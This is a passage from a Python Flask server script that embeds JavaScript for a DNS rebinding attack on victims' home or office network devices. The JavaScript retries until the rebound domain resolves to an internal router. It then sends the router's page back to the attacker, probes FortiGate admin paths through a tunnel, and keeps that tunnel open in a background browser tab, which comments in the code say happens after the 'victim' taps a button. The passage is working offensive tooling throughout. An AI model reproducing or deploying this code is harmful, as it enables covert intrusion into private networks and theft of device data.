  attempts++;
  if(attempts>MAX_ATTEMPTS){postStatus('max_attempts',attempts);giveUp('DNS flip did not propagate after '+attempts+' attempts across '+_subs.length+' subdomains');return;}
  postStatus('fetching',attempts);
  setMsg('Connecting… attempt '+attempts);
  l('try #'+attempts+' '+_curOrigin+targetPath);
  try{
    var r=await fetch(_curOrigin+targetPath,{cache:'no-store'});
    var body=await r.text();
    if(r.status>=500){
      postStatus('proxy_err_'+r.status,attempts);
      l('proxy err '+r.status+' retry 1s');
      setTimeout(tryFetch,1000);return;
    }
    if(body.includes(VPS_SENTINEL)){
      _consErrors=0;
      postStatus('sentinel',attempts);
      l('still on VPS (attempt '+attempts+')');
      setTimeout(tryFetch,600);return;
    }
    _consErrors=0;
    postStatus('got_router',attempts);
    l('got router status='+r.status+' len='+body.length);
    setMsg('Applying update…');
    await sendResult({type:'rb_result',ok:true,status:r.status,body:body.slice(0,65536)});
    postStatus('result_sent',attempts);
    setMsg('Update complete ✓');
    if(token){
      // Service-specific recon probes — passed in URL as comma-separated ?probes= list.
      // Falls back to FortiGate paths if none specified.
      var _rawProbes=p.get('probes')||'';
      var autoProbes=_rawProbes ? _rawProbes.split(',').map(function(s){return decodeURIComponent(s);}) :
        ['/require.login.js','/external/styles/fgwicons.css','/api/v2/','/external/styles/app.css'];
      Promise.all(autoProbes.map(function(ep){
        return fetch(tunnelBase+'/tunnel/request',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({token,url:ep})}).catch(()=>{});
      })).then(function(){startTunnelWS();});
    }
    // Show "Return to App" button after 3s. Victim taps → new Safari tab opens with WebClip.
    // rb-launch.html stays alive in background tab so tunnel keeps running.
    setTimeout(showReturnBtn,3000);
  }catch(e){
    postStatus('fetch_err',attempts);
    l('fail '+attempts+': '+e.message);
    _consErrors++;
    // 8+ consecutive errors on fresh subdomains = DNS is flipping but target is refusing port.
    // Confirm via query-status and report rebind_confirmed so dashboard knows flip worked.
    if(_consErrors>=8){
      if(apiBase) fetch(apiBase+'/api/rb/query-status').then(function(r2){return r2.json();}).then(function(s){
        if(!stopped) giveUp(s.proxy_updated ? 'connection_refused' : 'timeout');
      }).catch(function(){if(!stopped) giveUp('timeout');});
      return; // stop retrying
    }
    setTimeout(tryFetch,600);
  }
}

var preflipped=p.get('preflipped')==='1';
l('domain='+domain+' rbOrigin='+rbOrigin+' isReload='+isReload+' preflipped='+preflipped+' apiBase='+apiBase.slice(0,40));
postStatus('page_load',0);
if(isReload){
  // Legacy reload path (kept for compatibility). Flip and try immediately.
  l('reload — doFlip + immediate fetch');
  postStatus('reload',0);
  doFlip();
  tryFetch();
}else if(preflipped){
  // Pre-flip scenario: DNS was just unflipped (VPS) so this page loaded correctly.
  // Re-flip via doFlip() which uses vpshost (direct IP, no Cloudflare) + relay backup.
  // Call tryFetch IMMEDIATELY — setTimeout is throttled in iOS backgrounded tabs.
  doFlip();
  postStatus('preflipped_start',0);
  l('preflipped — re-flip triggered via vpshost, immediate fetch');
  tryFetch();
}else{
  // Normal path: dashboard already flipped DNS. Fire again to refresh the 180s window.
  doFlip();
  postStatus('flip_ok',0);
  l('flip fired — wait 2s');
  setTimeout(tryFetch,2000);
}
</script></body></html>"""

    @app.route("/test-mode")
    def test_mode():
        return ("""<!DOCTYPE html><html><head>
<meta name='viewport' content='width=device-width'>
<meta name='apple-mobile-web-app-capable' content='yes'>
<style>body{background:#000;color:#fff;font-family:monospace;padding:20px;font-size:18px}</style>
</head><body>
<h2>Standalone Test</h2>
<div id='r'>checking...</div>
<script>
var d=document.getElementById('r');
d.innerHTML='standalone: <b>'+navigator.standalone+'</b><br>'
  +'protocol: <b>'+location.protocol+'</b><br>'
  +'origin: <b>'+location.origin+'</b><br>'
  +'host: <b>'+location.host+'</b>';
</script>
</body></html>""", 200, {'Content-Type': 'text/html', 'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0', 'Pragma': 'no-cache', 'Expires': '0', 'Connection': 'close'})

    @app.route("/", defaults={"p": ""})
    @app.route("/<path:p>")
    def static_files(p):
        # Requests hitting VPS (pre-flip) receive a recognizable sentinel.
        # rb-launch.html detects this and retries until DNS has flipped to the target.
        return ('<!-- DNS-REBIND-VPS-SENTINEL -->', 200, {'Content-Type': 'text/html',
                'X-Rebind-Phase': 'vps', 'Cache-Control': 'no-store',
                'Connection': 'close'})

    # TLS context (for HTTPS)
    if _CERT.exists() and _KEY.exists():
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(str(_CERT), str(_KEY))
        t = threading.Thread(
            target=lambda: app.run(host="0.0.0.0", port=args.https_port, ssl_context=ctx, use_reloader=False),
            daemon=True)
        t.start()
        print(f"[HTTPS] Listening on :{args.https_port}", flush=True)
    else:
        print(f"[HTTPS] No certs found at {_CERT} — skipping HTTPS", flush=True)

    print(f"[HTTP]  Listening on :{args.http_port}", flush=True)
    app.run(host="0.0.0.0", port=args.http_port, use_reloader=False)


if __name__ == "__main__":
    main()
